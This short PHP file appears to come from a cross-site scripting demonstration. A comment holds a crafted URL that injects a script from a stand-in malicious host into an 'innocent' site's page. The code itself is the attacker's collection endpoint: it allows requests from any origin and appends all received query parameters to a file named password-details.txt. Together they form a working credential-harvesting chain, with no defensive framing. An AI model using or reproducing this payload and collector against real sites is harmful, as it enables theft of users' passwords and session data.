<?php

// http://innocent-site.colab/xss-example/?campaign_id=%27;%3C/script%3E%3Cscript%20src=http://malicious-site.colab/evil-xss.js%3E%3C/script%3E%3C/script%3E

header('Access-Control-Allow-Origin: *');
$fh = fopen('password-details.txt', 'a');

fwrite($fh, print_r($_GET, TRUE));
